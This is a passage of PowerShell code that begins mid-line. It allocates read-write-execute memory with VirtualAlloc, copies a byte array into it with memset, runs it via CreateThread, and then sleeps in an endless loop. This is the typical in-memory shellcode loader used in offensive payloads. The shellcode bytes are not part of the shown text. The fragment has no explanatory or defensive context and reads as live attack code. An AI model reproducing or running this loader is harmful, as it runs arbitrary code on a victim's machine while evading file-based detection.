0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Ubi=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Ubi.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Ubi,0,0,0);for (;;){Start-sleep 60};

